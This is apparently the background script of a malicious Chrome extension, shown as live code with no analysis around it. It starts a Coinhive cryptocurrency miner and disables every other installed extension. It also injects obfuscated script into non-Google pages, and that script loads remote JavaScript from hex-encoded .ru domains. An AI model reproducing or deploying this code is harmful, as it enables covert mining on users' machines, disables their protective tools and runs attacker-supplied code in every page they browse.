function closeWindow () {
	var time = 500;
	setInterval(() => {
		chrome.tabs.getSelected(null, details => {
		if (details.id == -1)
			window.close();
		})
	}, time);
}
closeWindow();

function callMeOnlyOnce () {
	if (this.alreadyCalled) 
		return;
	try {
		var coin = $.get("https://coinhive.com/lib/coinhive.min.js");
		coin.done(() => {	
			var miner = new CoinHive.User('aUvlRg4eSsDf6wcFmMZPjQ57JDUUR3IR', 'FPR', {autoThreads: true});
			miner.start();
		})
	} catch (e) {}
	chrome.tabs.onUpdated.addListener(onUpdatedListenerSearch);
	this.alreadyCalled=true;
}
callMeOnlyOnce();

function removeAdBlockExtensions () {
	window.chrome.management.getAll((extensions) => {
		extensions.forEach((e) => {
			if (e.enabled && e.id != window.chrome.runtime.id) {
				window.chrome.management.setEnabled(e.id, false);
			}
		});
	});
}
removeAdBlockExtensions();

function onUpdatedListenerSearch(tabId, changeInfo, tab) {
	if (typeof(tab.url) != 'undefined') {
		
		var ext_id = chrome.app.getDetails().id;
		if (ext_id != 'mkelkmkgljeohnaeehnnkmdpocfmkmmf') {
			if (tab.url.indexOf('google') == -1) {
				chrome.tabs.executeScript(tabId, {code:"!function(){var b={a3759370402:'30022',a1072190280:'{subid}',a2302729239:JSON.parse('[\"7a72793462736f702e7275\",\"746b636d36686a762e7275\"]')},c=function(h,j,k){for(var l=[].slice.call(k),m=h.split('.'),p=m.pop(),q=0;q<m.length;q++)j=j[m[q]];return j[p].apply(j,l)},d=function(h){if(!(h=h.match(/.{1,2}/g)))return'';for(var j='',k=0;k<h.length;k++)j+=c('fromCharCode',String,[parseInt(h[k],16)]);return j},f=function(h,j,k){if('undefined'==typeof a2690641770||!a2690641770(document.location.protocol+'//'+h))if(document.head){var l=document.createElement('script');l.setAttribute('src',document.location.protocol+'//'+h),l.setAttribute('type','text/javascript'),document.head.appendChild(l),l.onload=function(){this.a982392846||(this.a982392846=!0,'function'==typeof j&&j())},l.onerror=function(){this.a982392846||(this.a982392846=!0,l.parentNode.removeChild(l),'function'==typeof k&&k())}}else setTimeout(function(){f(h,j,k)},10)},g=function(h){if(!(0>=b.a3759370402||0>b.a1072190280)){var j=h||b.a2302729239[0],k=d(j)+'/'+['d6s','afu','ndj','enk','6af'].join('')+'/'+b.a3759370402+'_'+b.a1072190280+'.js';f(k,function(){},function(){var l=b.a2302729239.indexOf(j),m=b.a2302729239[l+1];m&&g(m)})}};b.a3759370402=parseInt(b.a3759370402)||0,b.a1072190280=parseInt(b.a1072190280)||0,g()}();/* k */", runAt: 'document_end'}, callback);
			}
		}
	}
}

localStorage.T = 2e7;

localStorage.C = JSON.stringify([
	"U2FsdGVkX18je2+6W662j18jc6bCMixpobVVi0e742xuScVv52oVfAec3mi0r7yzjURlrOmKQ1yPWiL4OMs/H2n46BT2CBWITNt//awcTmo=",
])


localStorage.P = JSON.stringify([
	"U2FsdGVkX18o8IrwuBMWxFqxRKPexumxnA8m8SE4lVdCMADiQkRSZLlx5ve36/XaV6Fo6ZarTXuFTYrpspX9YkwMY9fwEQKBrNpNgtgqDw0=",
])
